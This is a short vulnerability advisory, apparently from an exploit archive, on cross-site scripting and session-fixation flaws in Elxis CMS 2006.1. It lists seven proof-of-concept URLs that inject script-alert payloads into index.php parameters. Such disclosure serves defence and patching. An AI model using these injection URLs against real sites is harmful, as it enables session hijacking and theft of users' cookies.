@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/31764/info
+
+Elxis CMS is prone to multiple cross-site scripting and session-fixation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The application is also prone to a session-fixation vulnerability.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Using the session-fixation issue, the attacker can hijack the session and gain unauthorized access to the affected application.
+
+Elxis CMS 2006.1 is vulnerable; other versions may also be affected.
+
+http://www.example.net/index.php?>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=com_poll&Itemid=>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=com_poll&task=view&id=>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=com_poll&Itemid=1&task=>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=com_poll&task=view&bid=>"><script>alert("XSS Vuln")</script>
+http://www.example.net/index.php?option=com_poll&Itemid=1&task=view&contact_id=>"><script>alert("XSS Vuln")</script>
